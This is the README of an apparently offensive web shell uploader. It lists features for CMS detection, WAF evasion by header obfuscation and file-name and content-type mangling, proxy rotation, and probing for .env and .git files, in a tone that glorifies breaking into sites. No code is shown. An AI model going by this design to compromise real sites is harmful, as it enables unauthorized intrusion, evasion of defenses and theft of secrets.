# AdaptiveShellUploader
**Upload your shell, bypass WAFs, and own the web â€” one upload at a time.**

This tool is crafted for cyber warriors who want more than just basic uploads. `AdaptiveShellUploader` is a powerful reconnaissance and web shell uploader that adapts based on the CMS detected, upload form structure, and WAF defense mechanisms.

### Features:
- **Smart Reconnaissance:** Detects CMS (WordPress, Joomla, Drupal, Magento, etc.), headers, WAF presence, and upload forms.
- **AI-style Logic:** Uses decision trees to pick the best attack path based on environment detection.
- **Proxy Support:** Automatically loads and rotates HTTP/HTTPS proxies from `proxies.txt`.
- **WAF Bypass Engine:** Detects WAF through header heuristics and uses header obfuscation + variant file uploads to sneak in payloads.
- **Adaptive Payloads:** Uploads PHP web shell variants with content-type and name mangling.
- **Deep OSINT Mode:** Automatically scans for interesting endpoints (`robots.txt`, `.env`, `.git`, etc.)
- **CMS-aware Exploitation:** Adjusts its upload approach depending on CMS.

- Make sure you have authorization before running it on any system.
- By default, it will look for the string `SHELL_OK` to verify successful uploads.
